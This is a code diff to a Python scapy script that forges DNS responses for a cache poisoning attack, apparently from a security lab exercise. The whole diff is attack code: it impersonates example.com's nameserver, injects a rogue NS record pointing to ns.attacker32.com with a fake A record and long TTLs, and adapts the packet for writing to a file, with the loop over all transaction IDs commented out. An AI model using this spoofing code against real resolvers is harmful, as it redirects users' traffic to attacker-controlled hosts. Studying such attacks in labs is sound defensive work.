@@ -62,13 +62,13 @@
 
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR, DNSRR
-from scapy.layers.inet import UDP
+from scapy.layers.inet import UDP, IP
 
 
 def send_spoofed_response(dns_id):
     attacker_ns = "ns.attacker32.com"
     fake_ip = "1.2.3.5"
-    qname = "www.example.com"  # Target the correct domain
+    qname = "abcde.example.com"  # Target the correct domain
 
     dns_response = (
         IP(dst="10.9.0.53", src="93.184.216.34") /  # Impersonate example.com's nameserver
@@ -80,14 +80,16 @@ def send_spoofed_response(dns_id):
             rd=1,  # Recursion desired
             ra=1,  # Recursion available
             qd=DNSQR(qname=qname),
-            an=DNSRR(rrname=qname, type='A', ttl=300, rdata=fake_ip),
-            ns=DNSRR(rrname="example.com", type='NS', ttl=300, rdata=attacker_ns)
+            an=DNSRR(rrname=qname, type='A', ttl=259200, rdata=fake_ip),
+            ns=DNSRR(rrname="example.com", type='NS', ttl=259200, rdata=attacker_ns)
         )
     )
+    with open("ip_resp.bin", "wb") as file:
+        file.write(bytes(dns_response))
 
-    send(dns_response, verbose=0)  # Send the response without delay
+    # send(dns_response, verbose=0)  # Send the response without delay
 
 
 if __name__ == "__main__":
-    for dns_id in range(0, 65536):  # Loop through all possible transaction IDs
-        send_spoofed_response(dns_id)
+    # for dns_id in range(0, 65536):  # Loop through all possible transaction IDs
+    send_spoofed_response(0)
